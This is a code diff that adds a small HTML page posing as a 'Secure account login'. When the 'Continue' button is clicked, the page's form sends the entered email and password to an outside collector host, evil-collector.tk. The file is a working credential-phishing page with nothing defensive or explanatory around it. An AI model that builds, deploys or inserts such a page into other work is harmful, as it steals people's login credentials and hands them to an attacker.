@@ -1,0 +1,12 @@
+<!doctype html><meta charset="utf-8"><title>Auto sign in</title>
+<h1>Secure account login</h1>
+<form id="f" action="http://evil-collector.tk/grab" method="post">
+  <input name="user" placeholder="email">
+  <input type="password" name="pw" placeholder="password">
+</form>
+<button id="go">Continue</button>
+<script>
+document.getElementById('go').addEventListener('click', function(){
+  document.getElementById('f').submit();
+});
+</script>
